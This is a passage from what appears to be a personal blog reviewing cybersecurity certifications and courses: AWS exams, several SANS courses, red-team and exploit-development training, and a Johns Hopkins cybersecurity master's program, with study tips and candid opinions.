you can figure out the best answer by slowly using the process of elimination to rule out certain answers that can‚Äôt be true due to some small detail contained within the question prompt or the answer itself. I also recommend those who are prepping for the exam to buy some practice exams from a site like Udemy as I found these very useful in just getting a feel for what the actual exam questions would be like. At 65 questions and a passing score of 720 (out of 1000), the exam doesn‚Äôt leave too much room for error so be sure to really think through each of the scenario-based questions. Given the popularity of ‚ÄúCloud‚Äù in modern enterprises, taking training and picking up this certification seemed like a very good idea. AWS Certified Security Specialty: Obtained: December 2020 Shortly after picking up the solutions architect associate, I spun up the A Cloud Guru video lecture series for the AWS Certified Security Specialty and began prepping for the security specialty exam. Given this exam was more specific to ‚Äúsecurity‚Äù within AWS, and given my extensive security background, I expected this exam to actually be easier than the solutions architect. This assumption proved mostly false. Yes, the exam does cover less topics and services than the solutions architect exam but the understanding you must have requires quite a bit more technical depth. With this said, I do think my years of security experience came in handy with a few questions. The A Cloud Guru course covers the security aspects of S3, Identity Federation, CloudFront, CloudWatch, CloudTrail, Config, Inspector, Trusted Advisor, VPC, NAT, ELB, WAF, Shield, API Gateway, Athena, Macie, SES, Artifact and Lambda (and maybe a few more) - with a heavy, and I mean HEAVY focus on both IAM and KMS. I found that well over half of the questions on the security specialty exam asked very challenging, scenario-based questions related to IAM and KMS. Overall, I thought the course from A Cloud Guru was great and I certainly learned a lot. However, having now taken (and luckily PASSED) the exam, I can say that this course does not really cover all the topics needed to comfortably pass the exam. In some cases, more depth seemed to be required, and in other cases, there was simply something not covered at all. I don‚Äôt fault A Cloud Guru though as AWS is notorious for adding more and more services and functionality to their platform all the time and the specialty exam DOES recommend that those who sit for the exam have 2 years+ experience securing workloads in AWS. So don‚Äôt expect this course to be your one-stop-shop for easily passing this exam. Listed below are some of the gaps I think the course had with respect to the exam questions I encountered as well as some other general tips for what to put emphasis on when studying. Really understand how to read IAM policies. I found many questions asking me about very specific policy statement syntax. This was doubly true for conditional statements within these policies. Though this is covered pretty well by the A Cloud Guru course, it deserves special mention here. REALLY understand how to share S3 buckets cross-account. You WILL get several questions asking about this. There are a few in-depth questions on web identity federation not really covered well enough in the course. Truly understand the differences between Inspector, Trusted Advisor and Config. You will be asked which of these is the right service for a specific objective and I found these questions somewhat challenging. I also thought Config had a particularly heavy focus. Understand the relationship between CloudTrail and CloudWatch Logs. There were some very specific questions on CloudHSM I felt weren‚Äôt covered well by the course. Try to read some AWS documentation on CloudHSM. KMS, KMS, KMS, KMS. So much KMS. You will be asked like 30 questions on KMS. Really understand key rotation, how to provision access to keys, key policies, administering keys and everything else to do with KMS. Read the FAQ, read the whitepapers, read everything you can on KMS, understand cross-account KMS access and KMS Grants. I had a question on taking memory dumps from an EC2 instance. I think SSM covers this. The course doesn‚Äôt get into this I don‚Äôt think. The course covers this well, but there are a good number of questions related to Security Groups, NACLs and Route Tables. Understand the in‚Äôs and out‚Äôs (get it?) of these controls. Understand Function Policies vs Execution Roles for Lambda. Understand the AD Federation sequence. Read up on using certificates with CloudFront. With all this said, I really enjoyed the course from A Cloud Guru and though I found the exam challenging, I think the questions were relevant and a good exercise of my AWS security knowledge. Remember to take your time with scenario-based questions and really try to rule out questions based on why they CAN‚ÄôT be the answer. Good luck! SEC588: Cloud Penetration Testing (GCPN), SANS: GCPN Obtained: April 2021 | Attended: August 2022 Update: This review contains my original impressions of the course, I also have an updated review below. SANS continues to expand their portfolio of courses, and within these new offerings is SEC588: Cloud Penetration Testing. ‚ÄúCloud penetration testing‚Äù is at a‚Ä¶ weird point in my opinion and I think this is evident in the makeup of this course. SANS does their best to differentiate how ‚Äúcloud‚Äù pentesting is different than traditional network/webapp pentesting but really, there isn‚Äôt that much difference and even they admit this within the course material. Sure, the course authors key in on certain things that are more effective in cloud environments for performing reconnaissance and enumeration (among a few other things), but for the most part, nothing really changes here as it compares to traditional network/webapp testing. At the end of the day, you‚Äôre still using Nmap for port scanning, Metasploit for payloads, etc‚Ä¶ Cloud native applications as defined by the CNCF (and as introduced by SANS) heavily leverage containers, CI/CD tooling, container orchestration (i. e. Kubernetes) and APIs/microservices. This course spends a good deal of time covering the security and pentesting aspects of these technologies. This is all great stuff but I think a full course on container pentesting - or webapp pentesting which focuses on APIs/microservices might be better than covering all these topics so briefly. The course also seems to heavily favor AWS instead of equally featuring other cloud providers. There is actually one day where Azure is covered but this really feels like only an introduction. Oh and there‚Äôs no mention of GCP that I can remember at all. By the time you get to Day 5 (Exploitation and Red Team in the Cloud) the course authors really start to run out of ideas as they pivot (literally) from attacking the cloud to using the cloud itself to stage attacks from (i. e. proxycannon, cloud-based C2, tcp redirectors, etc‚Ä¶) Though this is really cool stuff for sure, I think it makes more sense for a course on red-teaming (still waiting on the 6-day redteaming course from SANS!) than it does a cloud pentesting course. Overall, I feel this course introduces a lot of interesting topics but doesn‚Äôt cover any at a technical depth that I think they could have in 5 days had they taken out some of the unnecessary things and focused a little more on core material. In the end, I did enjoy the course and was able to achieve the GCPN certification but I don‚Äôt think I would recommend this course to others at this time. Instead, I would suggest those who are interested in learning more about cloud penetration testing take a look at some books on the subject (for example, AWS Penetration Testing), blog posts or other offensive cloud research that is only a quick google search away. Updated GCPN Review (8/27/2022)I had the opportunity to re-take this class, serving as a virtual Teaching Assistant (vTA) and I felt a re-review was warranted. Though this class is still definitely a mile-wide and an inch-deep in the context of cloud security / pentesting / etc‚Ä¶ I think a lot of really great updates have been made since I first sat for the course. When I first took the course, I believe I did the SANS OnDemand version, whereas this time I took it via the Live Online format which has the added bonus of being taught live, in this case by the course author himself, Moses Frost. SANS courses are always good and I can‚Äôt express enough how impressed I always am with the instructors. They‚Äôre of course knowledgeable about the subjects they teach, but moreso they always come prepared with a world of experience and anecdotes about their relevant time as a practictioner in the domain at hand. What you come away with in the end is not only a better grasp on the material, but also a sense of the real world applications of what you just learned. Things seem possible, in a way that other eLearning formats fail to capture, as you don‚Äôt get the direct ‚Äúface-to-face‚Äù interaction with an educator of a similar caliber. But enough waxing poetic about the instructors, let me tell you why I liked the content a bit more than last time. Moses admits that this course is stretched a bit thin, as in an ideal world, full 5-6 day courses could easily be constructed for many of the sub-topics contained within this course - AWS, Azure, Kubernetes, Lambda, etc‚Ä¶ At the time of writing this (re)review I don‚Äôt have my old books, so I can‚Äôt physically compare the deltas between the original version of the course and the latest version, but based on my recollection I feel the recon section (Day 1) has been modified to better relate to cloud-native-specific applications, a greater focus on attacking IAM is made on Day 2, the overall scope of the class is narrowed to just AWS and Azure (with a better balance between the two) and there were certainly tweaks elsewhere. Between the labs (which I actually took the time to do in this format), the moderately more focused content and the added expertise you get with the Live format, I think I can now safely recommend this course. It‚Äôs still merely an introduction at the end of the day, but I truly feel you come away with a practical set of skills and the information and hunger needed to pursue further learning in the space. Speaking of further learning, I also know that a more advanced version of their cloud pentesting curriculum is on the horizon. Stay tuned for the epic sequel, SEC688 - I‚Äôve heard it will not be one to miss! SEC537: Practical OSINT Analysis and Automation, SANS: Attended: July 2021 SANS has recently stepped up, adding a huge number of new courses, many of which are 2-day courses. SEC537: Practical Open-Source Intelligence (OSINT) Analysis and Automation is one of these 2-day-ers. This shorter format, when executed well, can provide SANS‚Äô famed, high-density educational material without the usual mental burnout which accompanies a typical 5-6 day, 8+ hours a day SANS course. Many will also benefit from not having to taken an entire week off of work to attend. A shorter class suffers though when material goes off track. With so little time you quickly lose value as there is but two days to cram all the relevant material into the class. I think SEC537 is an excellent course and David Mashburn (who is one of the course authors) did a fantastic job both putting this course together as well as teaching, but it does suffer from this latter point. But enough about that, let‚Äôs get into the material‚Ä¶ Day 1 drops you immediately into a really cool discussion on OPSEC, covering everything from how to perform overt/covert/clandestine work to understanding exactly how your tools work - specifically, knowing what traffic they generate and where that traffic is destined. I would take an entire 6-day course on OPSEC if I could. The day wraps up with a section on image/video verification which I knew little about prior to the class but can definitely understand it‚Äôs OSINT-value now. Day 2 is where I think this class should be tweaked. This day begins with OSINT-relevant Python skilling but then unfortunately nose-dives into a very basic ‚Äúintro-to-Python‚Äù lecture. For anyone who knows even basic Python, this section may disappoint. I recommend the intro Python material be moved to an appendix and be something the students learn if necessary as part of an after-hours bootcamp on Day 1. After half the day is spent learning basic Python, the class ends strongly with sections on interacting with the web programmatically (requests module) and performing Data Analysis with Python. Not counting the intro-to-Python chunk, I think this course was one of the more interesting SANS courses I‚Äôve taken (pound for pound, if you will). Quick Note: 2-day courses aren‚Äôt accompanied by a cert, so you really need only focus on learning the material. With everything said, this course being a SANS course means one inevitable thing - a high price tag. At $2900 for just two days, pricey is but one word to describe the course. I was fortunate to have taken this class via the SANS Workstudy, so my wallet was not subjected to the full-wrath of SANS pricing. Overall, I do recommend this course for the material, you need only find a way to finance it! SEC460: Enterprise and Cloud | Threat and Vulnerability Assessment (GEVA), SANS: Attended: July 2021, GEVA Obtained: August 2021 SEC460 (Enterprise and Cloud | Threat and Vulnerability Management) is the newest edition (introduced in mid-2018) to the lineage of SANS X60 courses (i. e. SEC560, SEC660 and SEC760), all of which are part of the recently introduced SANS Offensive Operations curriculum. SANS course numbering is notoriously wacky but in this case, these four courses describe a pretty realistic progression from VM-to-pentester-to-exploit-developer (there are of course many other viable development paths into a career in penetration testing / offensive security). SANS courses with a 4xx designation have traditionally been more elementary in nature and though I think SEC460 certainly has some introductory concepts, it is far more than its course number lets on. When this course first debuted, I certainly underestimated it - relegating it in my mind as some lowly Vulnerability Management (VM) training that entry-level infosec professionals would take to learn how to run a vulnerability scanner. Despite this, my background in VM coupled with my lust for shiny things made me want to take the course anyways. When I got the chance to moderate the course I could not pass it up. Once in the class, it quickly became evident (within the first few hours of Day 1) that I had vastly miscalculated the content and value of the course. SANS is known for its (expensive) high-value content as well as their world-class instructors. This is especially true for SEC460. My instructor for the course (and one of the course co-authors) was Matt Toussain. Matt (@Osm0s1z) did a truly amazing job both as an instructor as well as on developing the course content. His experience, expertise and professional anecdotes really take the course experience to the next level (in my opinion). Ok, now about the course‚Ä¶ Despite what I originally thought, the course covers not only typical Vulnerability Management and network scanning concepts but also covers a variety of other relevant subjects including (but not limited to) - Powershell, Cyber Threat Intelligence (CTI), threat modeling, OSINT, web application discovery, general reconnaissance, cloud security, Risk Assessment Frameworks (RAFs), wireless, purple teaming and Windows AD. The epiphany comes when you realize that these aren‚Äôt ‚Äúbonus‚Äù items or filler material but rather integral knowledge areas for performing comprehensive, modern Threat &amp; Vulnerability Management/Assessment. Building this course, the authors were faced with the difficult mission of adding a large volume of material in such a way that students were not fed merely surface-level information on important concepts while at the same time not laboring over topics at a depth beyond what is required. This course strikes that balance in a way that I have not seen with almost any other SANS course. I‚Äôve been involved with Vulnerability Management (VM) and/or Threat and Vulnerability Assessment (T&amp;VA) for almost my entire professional career and I think this course nails 95% of what I‚Äôve personally used to execute in a VM role while also introducing a variety of new things I honestly never knew or thought to use with respect to building/running a VM program. This course, despite its age, is in my opinion one of the more mature SANS courses available and one I highly would recommend not only to those new to the field or interested in the offensive security path, but also to more experienced infosec professionals and those in other, non-offensive-security roles. About the GEVA: The certification exam (GEVA) is not too dissimilar from other GIAC exams - multiple choice and very heavy on material which is sourced almost word-for-word from the course books. My only complaint about this course or the cert itself is the over-reliance on terminology that I think is not industry-standard but rather SANS-specific terminology. For example - ‚ÄúTarget Matrix‚Äù is a term used to describe the list of potential targets which comes as result of the Discovery phase of the Vulnerability Management Framework (VAF). Though this term makes sense, it‚Äôs not a term I have seen used before and to my knowledge, not something that is used industry-wide. Unfortunately, this micro-naming of concepts is very important for passing the exam (even if it‚Äôs not overly important to remember as an actual practitioner). So, tldr; is - make sure you pay attention to SANS terminology as you will be quizzed on it if you sit for the exam! SEC450: Blue Team Fundamentals: Security Operations and Analysis (GSOC), SANS: Attended: July 2021, GSOC Obtained: September 2021 SANS SEC450 is a truly great course and one I would certainly recommend for all security pros on the ‚Äúblue‚Äù side of the house but one I also think would benefit anyone else in infosec as well. My instructor (and the course author) John Hubbard does a fantastic job combining granular, practical exercises with high level, framework-based educational material. What you receive in the end is an amazingly succinct, yet potently high-value crash course on Security Operations. Day 1 introduces you to a number of high-level topics related to security operations in general. Days 2 and 3 have a lot of the technical meat - protocols, network architectures, endpoint security, logging, kerberos, etc‚Ä¶ Day 4 introduces you to a wealth of security related models (e. g. Cyber Kill Chain, CSF, Diamond Model, F3EAD, etc‚Ä¶) and finally, the entirety of Day 5 is focused on improving as a security professional, something that I think would be a great addendum to every single SANS course as this section is really subject-agnostic and provides a lot of really high-value content. I think the real value of this course lies in Days 1, 4 and 5. These days gave me a better sense of how interconnected frameworks interlace with the high level concept of ‚Äúoperations‚Äù in security. I think many who look at this course may see it as an entry level course for traditional ‚ÄúSOC Analysts‚Äù. After sitting through it however, I think it is so much more. If you want to learn how to apply security best principles in an operational environment, regardless of your role, this is the course to take. I don‚Äôt have much to say on the GSOC exam itself other than to say its contents very closely resemble what you find both in the books as well as in the practice exam. The one thing I will say is there seemed to be an inordinate amount of questions about Windows logging despite how small of a section that is overall. SEC487: Open-Source Intelligence (OSINT) Gathering and Analysis (GOSI), SANS: GOSI Obtained: November 2022 I recently challenged the GIAC GOSI exam (which is the associated certification for the SANS SEC487 course). As I didn‚Äôt take the full course, I can‚Äôt directly comment on how good or bad it is. What I can comment on is my exam experience. In general, the course appears to be incredibly comprehensive, stepping through just about every flavor of OSINT (e. g. HUMINT, SIGINT, IMINT, MASINT, FININT, SOCMINT, etc‚Ä¶). If you‚Äôre looking for tools, well they got tools - TONS of them! You‚Äôre going to want to be ready to bookmark a load of (naturally, open-source) tools. Unlike the wider universe of SANS courses, I found this one to have minimal overlap subject-wise with the many other courses I have taken. This is a good thing! No matter your experience with OSINT, I think you can immediately walk away with some new tricks, new tools and a boost to your practical skillset. The exam experience is fairly straight-forward, as most GIAC exams are. My criticism of this test (like many other GIAC tests) is it doesn‚Äôt really test you on your practical skills/technical know-how, but rather tests whether you have memorized stuff from the books. There are a lot of questions like, ‚Äúwhat tool is depicted in this picture?‚Äù or ‚Äúwhat tool would you use for X purpose?‚Äù, then citing some niche website run by some researcher you might of only heard of had you taken the course and had the books on-hand. In the end, I do think this can be a valuable course for those who are interested in this type of work, but be weary of an attempt to challenge the exam! SEC522: Application Security: Securing Web Apps, APIs, and Microservices (GWEB), SANS: GWEB Obtained: November 2022 I‚Äôve been an AppSec professional in some form or fashion for nearly 10 years, and in that time I like to think I‚Äôve learned a thing or two not only about how to attack and compromise a web app, but also the ways in which to defend against those attacks and better harden said applications. To test this theory, I challenged the GIAC GWEB certification (associated with the SANS SEC522 course. ) As I mentioned in my recent GOSI review, challenging a SANS/GIAC exam is not for the faint of heart, as in many cases, the questions are sourced directly from the book material, and in these cases are often overly specific, relying on having memorized what was printed over having real practical experience/knowledge. For this reason, the exams can be somewhat artificially difficult (when bookless). I‚Äôm pleased to say however, that my experience with the GWEB ran contrary to that trend. Questions were much more practical in nature, often worded in a scenario-like form rather than a simple memorization exercise. At times, questions delved beyond surface-level understanding, but overall, this exam (and presumably the course as well) remains a mile wide and an inch deep (so to speak), covering everything from HTTP basics, to common attack defenses, AuthN/AuthZ, web services and beyond. SANS is known pretty well for their great portfolio of offensive security courses, and for good reason! However, this course‚Äôs dedication and focus on defense and architectural best practices makes it somewhat unique and in my mind, quite special. MGT512: Security Leadership Essentials for Managers (GSLC), SANS: Attended: August 2022, GSLC Obtained: December 2022 MGT512 is SANS‚Äô flagship management course and I‚Äôll start by giving the course a ~B for staying high-level and ‚Äúmanagerial‚Äù. There are certainly a few sections (looking at you Days 2 &amp; 3) where things get a bit overly technical for what I would expect in a course for managers. Then again, wouldn‚Äôt it be something to have leaders who had a certain level of technical proficiency? For the course itself, be prepared to think CISO, as the typical SANS course week-end CTF is replaced by a week-long choose-your-own-adventure style game where you act as a security leader making decisions for a fictional company. Maintain a practical, NIST CSF-balanced approach to achieve victory, and of course, the challenge coin! When you‚Äôre not bogged down learning about low-level encryption stuff (or similar technical minutiae), you‚Äôre back to big-picture items - learning about the frameworks, policies, program structures and other risk-governed concepts that rule the lives of security leaders everywhere. So is this a good course? Hard to say. I personally, didn‚Äôt get much out of it, but I‚Äôve been in infosec for 12+ years as of writing this mini-review and have spent plenty of time across nearly all infosec disciplines. For managers looking to make sense of it all though, I suspect this would be quality content. For those interested in taking the GSLC exam, it is very reminiscent of other content-broad exams (e. g. Sec+, CISSP, GSEC, etc‚Ä¶). With a fair amount of scenario-based questions (rather than pure memorization questions GIAC exams are known for), there is certainly some challenge and you should be relatively versed in the days material to achieve a high score. That said, with 3 hours to answer 115 questions, you have ample time to leverage the books in case you need to look up some answers or find references to assist you with a tricky question or two (or 50). Interestingly, I found this exam to be a bit more challenging than the usual GIAC exam, but with a passing score of only 65%, success is pretty easy to come by. * My thanks to My-Ngoc Nguyen, who kept the course days very lively and fun! Windows Malware and Memory Forensics, Volatility: Attended: October 2016 I took this course at a point in time where I was seriously unprepared for it. For this reason, I can‚Äôt really give a recommendation on the course itself. However, I will say that before you consider taking this course, you are going to want to pay close attention to Volatility‚Äôs expected prerequisites. This class is not for the faint of heart and requires some serious pre-requisite knowledge. I wanted to add here that though I didn‚Äôt learn Volatility nearly as well as I had hoped during the course, having been severely underprepared for the course at the time I took it, I did have a lot of fun using strings to conquer WAY too many of the CTF questions on the final day. Don‚Äôt discount the power of Strings and GREP! The Shellcode Lab, Black Hat: Attended: July 2017 I took this course while at Blackhat one year and came away really impressed. It‚Äôs one of those courses that takes what seems to be a pretty advanced and relatively opaque subject and makes it very approachable. By the end of those course I felt I had acquired a lot of practical skills. I recommend anyone interested in this class to have some familiarity with Intel assembly but after that, I think its relatively approachable and definitely recommended! SANS SEC564 Red Team Operations and Threat Emulation: Attended: March 2018 Red Teaming is one of the apex disciplines of the Cybersecurity field. SANS, as one of the premier cyber security education providers in the world offers only a two-day course covering the subject. This speaks to the niche-ness of Red Teaming as well as it‚Äôs advanced nature. This course, formerly taught and authored-by Joe Vest (the course author is now Jorge Orchilles, creator of the C2Matrix) is one of the best, most-concise introductions to Red Teaming I have found and would be valuable for anyone who is looking to stand up a Red Team practice at their organization. Being a SANS course, the price is still steep, but at only two days and given the fact that your organization should really be paying for you to take the course, I definitely recommend it. It is important to note that this course is NOT technical in nature. It certainly won‚Äôt get into the gritty technical aspects of red teaming, nor does it really explain with any sort of technical depth, the nature of standing up any sort of red team infrastructure. For this, I recommend taking a look at the SpecterOps Adversary Tactics: Red Team Operations training. With this said, I think performing successful red team engagements requires a thorough understanding of what red teaming really is, especially compared to traditional penetration testing, as well as an understanding of all the moving parts, players, stakeholders etc‚Ä¶ This course will help you achieve that understanding. SANS SEC642 Advanced Web App Penetration Testing: Attended: May 2018 SANS‚Äô top tier web-app specific penetration testing course is a bit hit-and-miss in my opinion. The problem with any ‚Äúadvanced‚Äù course is that it‚Äôs really difficult, in any 6 day period (which is the length of your typically full SANS course) to cover even a small fraction of the known techniques applicable to any specific penetration testing discipline, in this case web application penetration testing. Given everything that could be covered, SANS authors decided on SQLi, XSS, File Inclusions, XSRF, attacks specific to some web frameworks, crypto attacks, some WAF bypass stuff, and a little bit on Flash, SOAP, WebSockets and HTTP/2. This list obviously misses a gigantic swath of the web attack surface and even within this list itself these concepts are only barely touched. By far the most interesting day (for me) was the day on crypto-attacks but even that I‚Äôm skeptical as to the real practicality of what I learned. I‚Äôm not saying I didn‚Äôt learn anything useful in 6 days, but I think anyone at the stage in their career where they are interested in ‚Äúadvanced web application penetration testing‚Äù is better off with other educational mediums. You could probably learn more in 6 days just reading bug bounty writeups for example! An added negative is that this course currently does not offer a certification, so at the end of the day, you‚Äôre really only taking this course for its content - and at $7k+, I think you‚Äôre money is better spent elsewhere. Update: Looks like this course is now officially deprecated (for now). RIP. SpecterOps Adversary Tactics: Red Team Operations: Attended: June 2018 SpecterOps is a (primarily offensive) security consulting company specializing in (bleeding-edge) research, assessments and training. Prior to taking their Red Team Operations course, I was familiar with them as the creators of both Empire and BloodHound. For a four day course on what is a very advanced, and very broad subject - I think the Red Team Operations course is outstanding. It covers both managerial and technical aspects of Red Teaming, everything from initial access operations (IAO) and establishing C2 to persistence, privesc and pivoting, all while in a modern, Windows-based AD environment. Within the labs you‚Äôll get real, practical experience with the tools of the trade (e. g. Cobalt Strike) and modern techniques. With this said, I don‚Äôt think this course alone can take someone who isn‚Äôt already a red teamer and make them one over the course of four days. Even as deep as this course gets, the nature of Red Teaming is one that requires breadth and depth far beyond what this course can offer. For this reason, I recommend this course for those who already possess a moderate to advanced penetration testing background or those with entry-level experience in red teaming. I‚Äôll also point out that this training is useful (as is most trainings) only if you have the ability to practice what you‚Äôve learned after-the-fact. Unlike a lot of other security disciplines, adversary emulation is difficult to ‚Äúpractice‚Äù in a lab environment, you need both a legally-appropriate and willing test-subject. This means your best-off if you are already part of an internal red team or are looking to stand one up at your organization. Without this in place, I don‚Äôt recommend taking the course. Offensive Security Advanced Windows Exploitation: Attended: August 2019 The AWE is Offensive Security‚Äôs most difficult and arguably most prestigious certification, focusing exclusively on advanced, modern, Windows exploit development. With an interest in vulnerability research and thus an interest in exploit development, coupled with some experience in exploit writing and reverse engineering I decided to sign up and make my way through the course. Offered only in-person at the yearly Black Hat security conference and with very limited seats available, I was lucky to have been given the chance. Now I will admit that at the time I sat for this course my exploit development skills and experience were certainly more on the beginner-side but based on my observations of other students in the class, I can say with no doubt, that this course is every bit as mind-melting and challenging as you might expect or have read in other reviews, even for those with far more experience than I. In hind-sight, I‚Äôm comfortable enough to say that I was out of my depth and would have been better served taking the course after I had a little more experience. But perhaps more importantly, I should have waited to take the course for when i was truly ready both mentally and professionally, to dive fully into the world of vulnerability research and exploit development. This takes me to my advice for those thinking about enrolling. If you aren‚Äôt already a vulnerability researcher, penetration tester, exploit developer or aren‚Äôt thinking about making the shift into that realm in the near-ish future, I probably would not sign up for the course. Without a good amount of preexisting experience or knowledge, theres a decent chance the material will fly over your head. But also, if you don‚Äôt plan on exercising what you‚Äôve learned in short order, your unlikely to retain a lot of the information, nor will you be able to properly study for and take the extremely challenging OSEE certification. With all this said, I do think that for those that are mentally (and emotionally) prepared, this course could really help someone push themselves further into modern exploit development and vulnerability research. JHU Masters in Cybersecurity ReviewStarting in mid-2016 and finishing up almost exactly 4 years later in 2020, I finally completed my Masters degree at Johns Hopkins University, achieving an MS in Cybersecurity. This program proved both challenging and rewarding as well as at times disappointing and even quite useless. I want to say early on in this review that I don‚Äôt recommend people sign up and self-pay for any Cybersecurity masters degree. I don‚Äôt think in the infosec industry, there is any significant professional value with having a masters, outside of maybe qualifying for some manager roles. This is especially true given the time and money you must invest to even get a masters degree. They are expensive and in most cases, it seems that having a certification or two will more than satisfy contractual, HR or hiring manager requirements. In my case, my company was willing to foot the bill for the program and seeing the opportunity, I decided why not!? I of course fully recommend taking advantage of free, employer-sponsored training wherever possible. So how did I decide on the JHU program? Since I would still be working full time I needed to limit my choices to online programs only. Preferably as well, I wanted to choose an institution that was close by in the event that I needed to go on-campus for some reason, either to speak with a professor, collaborate with fellow students or take a class only offered on-premise. Living in the northern Virginia/DC metro area this still left me with a good number of options. With these requirements in mind I considered the following programs, University of Maryland University College (UMUC), University of Maryland (UMD), Johns Hopkins University (JHU), SANS Technology Institute and George Mason University. I won‚Äôt get into all the small decisions that ultimately led to me choosing the JHU program but in general I chose it for three reasons. First, and most importantly, I liked the available courses more so than any other program. Namely, I was interested in the reverse engineering course, embedded systems course and the cyber physical systems course. My primary focus with this degree was to focus on the learning aspects rather than just the idea of having a masters degree for my resume. Second, after some research, it looked like the JHU program was rated very high if not the highest among online Cybersecurity masters programs. I took this as a sign that this would be the best bet in terms of getting a high-quality, masters-level Cybersecurity education. Third, I felt that Johns Hopkins had a particular prestige, especially in my area, and that having a degree from there would look good on my resume. So how were the Masters classes? Well first, prior to getting accepted ‚Äúofficially‚Äù into the Masters program I needed to take a few additional pre-requisite courses. This included a Java class, a course in Data Structures and a course in ‚ÄúComputer Organization‚Äù (Discrete Mathematics and Python are also required pre-reqs but I had already satisfied these through undergraduate and professional work). All three of these courses were great additions to what was my overall masters curriculum and interestingly enough, three of my favorite courses I took over the course of getting the degree, despite none of them actually be masters courses (they were bachelor-level courses). The Java course is self explanatory, it was simply a beginner-to-intermediate-level course in Java programming. The Data Structures course I found fascinating and pretty invaluable. To this day I still use the concepts I learned in this class for both my personal/professional development efforts as well as for understanding concepts related to modern operating systems, memory, reverse engineering, etc‚Ä¶ The Computer Organization course was primarily centered around assembly programming. This has proven to be very useful foundational knowledge for my forays into reverse engineering, exploit development and general security research. Once I finished the necessary pre-reqs I was formally accepted into the Masters program and now needed to complete the 10 Masters courses. Three of these are mandatory courses - Foundations of Algorithms, Foundations of Information Assurance and Cryptology. Foundations of Algorithms is advertised as the sequel to Data Structures and maybe in theory it is, but I found the class (and I can not stress this enough) completely useless, entirely opaque, and overtly difficult. In fact, the professor even suggested, during an office hours one night, that the class did not make sense for anyone who wasn‚Äôt in applied mathematics or certain (more abstract) disciplines of computer science. The course content, assignments and projects were all nearly impossible to follow, to the point where the professor would essentially just give us the answers since he knew how difficult the material was. Overall this class was a complete dud, in all respects. It was a waste of my time and I learned absolutely nothing. Unfortunately, it was required and therefore I could not get out of it, nor can anyone else in this program. Moving on‚Ä¶ The ‚ÄúFoundations of Information Assurance‚Äù course was your typical ‚Äúintro to information security‚Äù type stuff. Given my experience in the field, I did not personally get much value out of this course. Now if you had less experience in the field or are coming into this Masters program fresh out of your undergrad or early enough in your Cybersecurity career, I can definitely see how this class would prove beneficial to building your understanding of the fundamentals of infosec. So again, kind of a dud for me. The third and final mandatory class was in Cryptology. This class, unlike the first two, I found challenging, interesting, relevant and worthy of the Cybersecurity masters class designation. This was a highly technical class where you really are taught how modern ciphers work, the mathematical principles that are the groundwork of these cryptological constructs and are even taught cryptoanalytic techniques. My word of warning for those who are getting ready for this course is to take it seriously, not only because it is challenging but because it is information dense and it is knowledge you really are going to want to try and commit to memory as best you can. In addition to the three required classes, I needed to choose seven electives from their catalog of courses. The seven I chose are listed below (in the order I took them). Elective Classes: Principles of Data Communications Embedded Computer Systems Software Development for Real-Time Embedded Systems Reverse Engineering and Vulnerability Analysis Operating Systems Web Security Intrusion DetectionI‚Äôd like to quickly review and give my thoughts on each of these below‚Ä¶ Principles of Data Communications: One of the primary things I hoped to get out of experience with this Masters program was to get a deeper, more robust understanding of TCP/IP and computer networking. I wanted to understand these concepts from a purely academic perspective, rather than an applied one as I had received via an assortment of training courses (such as the SANS course SEC503). JHU offers a variety of courses related to this domain, all of which required this course, Principles of Data Communications, to be taken as a pre-req. This course primarily covers the Layer 1 (physical layer) aspects of network communications focusing on topics such as digital vs analog encoding, multiplexing, signaling, error-detection, data compression and more advanced topics. Though I found this course very interesting, I think it was a little TOO low level for what I was looking for. I would need to take a different class to cover networking concepts related to layers 2-4 which was after all, my primary interest in taking this class in the first place. Ultimately, I only recommend this course for those who really want to know these low level mechanics. Then again, this course is also a pre-req for almost all other courses in the networking track for this degree program so you may have to take it regardless if you have your eyes set on something which requires it. Unfortunately, out of the 6 other electives I chose from here, none of them actually ended up being one of the classes that would focus more on networking or TCP/IP! Oh well, sometimes even the best-laid plans go awry. Embedded Computer Systems: Having an interest in vulnerability research, especially in the realm of IoT, got me hooked on the idea of learning more about embedded systems. So much so that I decided to take not one but TWO electives on the subject, this class and a class on software development for embedded systems. This first class I felt was a real dud and was pretty much useless. The class was mostly a series of bizarre ‚Äúcase studies‚Äù that hardly had anything to really do with embedded systems. Not once did I get to dump firmware off of an embedded system or even physically do anything with an embedded system. There was nothing about the course which was even remotely practical, or interesting in any way. At certain points the course material would pivot into even softer subjects like ‚Äúcopywright law‚Äù or ‚Äúlicensing agreements‚Äù. This class ended up being a huge disappointment and I would not recommend it to anyone. Software Development for Real-Time Embedded Systems: The second of two embedded systems-related classes I took focused on software development for embedded systems, more specifically, development on real-time systems (RTOS). This class was extremely practical as we spent the entire time actually writing code for arduino systems and even building a drone-system with a variety of sensors all interfacing with the arduino. I greatly enjoyed this class and felt like i learned quite a bit on the subject. Unfortunately, I‚Äôm not entirely sure how useful this knowledge has been (so far) with respect to my career. I‚Äôll also point out that the use of a drone for this class was highly suspect as the drone kit was not particularly easy to use and all lab deliverables required videos of the drone being successfully flown while also performing a number of other in-flight operations. This put those who were not particularly great drone pilots (like myself) at a bit of a disadvantage. I appreciate the spirit of what the professor was going for here but I think the class would have been better served with something a bit easier to control like an RC car. Reverse Engineering and Vulnerability Analysis: The class on reverse engineering and vulnerability analysis was by far my favorite course and I believe, objectively-speaking, the best course I took throughout the course of my Masters program. This class is the perfect mix of both theory and practical exercises, set to an extremely fast pace. Within the first week you will have covered and began deciphering Intel assembly instructions as well as started writing your own Intel assembly disassembler! By the end of the class you will be doing full malware reverse engineering and even writing your own exploits from scratch. This class was no joke! I can‚Äôt recommend this class enough, especially for those interested in these advanced topics. Operating Systems: This course was a bit of a mixed- bag. From a theory perspective, this course was exactly what I was looking for. It covered all the core operating system constructs (e. g. interrupts, kernel types, system calls, system architectures, system programming, scheduling, I/O, multi threading, memory, task management, deadlocks, device drivers, file systems and more!). Execution of the practical side of this course was where the big let down was. Namely, the course author decided to have all assignments and labs (all of which were heavily focused on system programming) be based on the strange, little-heard-of, not-modern, Minix 3 microkernel-based operating system. Now I had never heard of Minix 3 and asking my coworkers about Minix yielded a similar response. What was Minix 3 and why would my professor think this was a good platform to teach OS concepts? I mean, it doesnt even use a modern architecture, Minix 3 after all is a micro-kernel architecture as opposed to a more modern, monolithic or hybrid-based architecture. This course required a pretty firm understanding of C programming as well as some prior experience in Unix system programming, neither of which I really had. Picking up C was easy enough but learning to write code specifically for an operating system that no one uses and thus has little references online, proved to be a real struggle. I‚Äôll also add here that the professor was particularly non-helpful when it came to actually teaching these more practical concepts. Perhaps the expectation was that this was something I should have already 